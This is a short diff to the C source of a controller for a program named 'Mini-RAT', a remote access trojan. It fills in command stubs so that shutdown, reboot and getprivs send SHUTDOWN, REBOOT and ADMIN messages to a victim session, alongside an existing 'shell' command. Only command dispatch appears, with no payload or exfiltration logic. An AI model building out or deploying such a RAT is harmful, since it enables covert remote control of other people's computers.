@@ -130,13 +130,13 @@ void parse_cmd(int sock, char *line) {
                 write_session(cur_session, "EXIT\r\n", 7);
                 kill_session(cur_session);
         } else if (strcmp(argv[0], "shutdown") == 0) {
-                //TODO: shutdown_client(1);
+                write_session(cur_session, "SHUTDOWN\r\n", 10);
         } else if (strcmp(argv[0], "reboot") == 0) {
-                //TODO: shutdown_client(0);
+                write_session(cur_session, "REBOOT\r\n", 8);
         } else if (strcmp(argv[0], "shell") == 0) {
                 run_shell(sock);
         } else if (strcmp(argv[0], "getprivs") == 0) {
-                //TODO: get_privs();
+                write_session(cur_session, "ADMIN\r\n", 7);
         } else if (strcmp(argv[0], "screenshot") == 0) {
                 //TODO: screenshot();
         } else if (strcmp(argv[0], "help") == 0) {
@@ -184,7 +184,7 @@ int main(int argc, char* argv[]) {
         pthread_t clisten_thread;
         pthread_create(&clisten_thread, NULL, control_listener, (void*)&cport);
         pthread_detach(clisten_thread);
-        
+
         while (running);
 
         log_msg(LOG_INFO, "Mini-RAT shutting down\n");
